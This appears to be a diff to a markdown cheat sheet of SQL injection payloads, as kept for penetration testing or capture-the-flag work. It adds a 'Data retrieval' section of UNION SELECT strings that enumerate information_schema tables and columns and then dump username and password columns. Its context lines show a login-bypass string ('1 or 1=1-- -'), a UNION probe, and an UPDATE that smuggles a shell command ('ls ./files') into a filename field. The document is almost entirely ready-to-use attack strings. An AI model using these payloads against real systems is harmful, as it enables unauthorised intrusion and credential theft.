@@ -52,6 +52,14 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 %' UNION ALL SELECT 1,2,3,CONCAT(0x716b7a7a71,0x6a4a7143494e46596b6d4c4c6569725a475572687178746d55434b687861796371705952614c7857,0x7176786271),NULL-- -
 ```
 ### Data retrieval
+```
+' union select 1,2,3,table_schema,table_name from information_schema.tables -- - >> To fetch database name with table name
+
+
+' union select 1,2,column_name,null,null from information_schema.columns where table_schema = 'database_name' and table_name = 'table_name' -- - >> To fetch column name from specific table
+
+' union select 1,2,username,password,null from database_name.table_name -- >> To fetch info from specific column
+```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
 1 or 1=1-- -
